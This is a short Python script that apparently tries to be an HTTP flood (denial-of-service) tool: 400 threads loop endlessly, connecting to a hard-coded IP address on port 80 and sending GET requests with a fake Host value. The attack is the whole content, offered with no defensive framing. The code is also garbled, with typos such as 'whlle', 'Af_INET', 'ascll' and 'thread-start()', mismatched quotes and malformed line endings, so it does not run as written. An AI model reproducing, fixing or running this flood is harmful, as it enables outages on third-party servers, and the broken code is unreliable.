import threading
import socket

target = '5.62.223.122"
port = 80
fake_ip = '183.50.32.20'

def attack():
    con = 1
    whlle True:
        s = socket.socket(socket.Af_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r.n").encode("ascll"), (target, target, port))
        s.sendto(("Host: " + fake_ip + '/r/n/r/n').encode('ascll'), (target, target, port))
        s.close()
        print(con)
        con += 1
        
for i in range(400):
    thread = threading.Thread(target=attack)
    thread-start()
